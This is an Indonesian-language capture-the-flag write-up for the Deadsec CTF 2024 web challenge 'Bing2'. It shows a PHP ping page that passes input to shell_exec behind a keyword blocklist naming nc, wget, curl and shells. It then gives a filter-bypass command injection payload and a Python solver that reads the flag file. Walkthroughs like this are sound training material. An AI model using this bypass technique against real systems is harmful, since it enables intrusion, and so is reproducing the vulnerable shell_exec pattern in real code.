# Bing2 - Web - Deadsec CTF 2024

Pada challenge kali ini kita diberikan sebuah web yang memiliki fitur untuk melakukan ping ke ip yang kita inginkan. untuk mendapatkan flag kita bisa memanfaatkan kerentanan yang menginjeksi command injection pada /bing.php.

## Source Code
```php
<?php

if (isset($_POST['Submit'])) {
	$target = trim($_REQUEST['ip']);

	$substitutions = array(
		' ' => '',
		'&'  => '',
		'&&' => '',
		'('  => '',
		')'  => '',
		'-'  => '',
		'`'  => '',
		'|' => '',
		'||' => '',
		'; ' => '',	
		'%' => '',
		'~' => '',
		'<' => '',
		'>' => '',
		'/ ' => '',
		'\\' => '',
		'ls' => '',
        'cat' => '',
        'less' => '',
        'tail' => '',
        'more' => '',
        'whoami' => '',
        'pwd' => '',
        'busybox' => '',
        'nc' => '',
        'exec' => '',
        'sh' => '',
        'bash' => '',
        'php' => '',
        'perl' => '',
        'python' => '',
        'ruby' => '',
        'java' => '',
        'javac' => '',
        'gcc' => '',
        'g++' => '',
        'make' => '',
        'cmake' => '',
        'nmap' => '',
        'wget' => '',
        'curl' => '',
        'scp' => '',
        'ssh' => '',
        'ftp' => '',
        'telnet' => '',
        'dig' => '',
        'nslookup' => '',
        'iptables' => '',
        'chmod' => '',
        'chown' => '',
        'chgrp' => '',
        'kill' => '',
        'killall' => '',
        'service' => '',
        'systemctl' => '',
        'sudo' => '',
        'su' => '',
        'flag' => '',
	);

	$target = str_replace(array_keys($substitutions), $substitutions, $target);

	if (stristr(php_uname('s'), 'Windows NT')) {
		$cmd = shell_exec('ping  ' . $target);
	} else {
		$cmd = shell_exec('ping  -c 4 ' . (string)$target);
        echo $cmd;
		
	}
}
```
Berdasarkan kode diatas hampir semua karakter yang dibutuhkan untuk mengeksekusi command injection ter blok, namun ada cara untuk melakukan bypass dan membaca file `flag` yang ada di `/`.

Berikut payload yang bisa digunakan untuk melakukan command injection:

```bash
127.0.0.1;${IFS}c'a't${IFS}/fl?g.txt
```

## Solver Code
```python
import httpx
import asyncio

URL = 'https://3dcd9349cfd35fa35a2b2936.deadsec.quest'

class BaseAPI():
	def __init__(self,url=URL):
		self.c = httpx.AsyncClient(base_url=url)

	def visit(self,cmd):
		return self.c.post('/bing.php',data={'ip':cmd,'Submit':'Submitted'})

class API(BaseAPI):
	...

async def main():
	api = API()
	res = await api.visit(';c\'a\'t${IFS}/fl?g.txt')
	print(res.text)

if __name__ == '__main__':
	asyncio.run(main())
```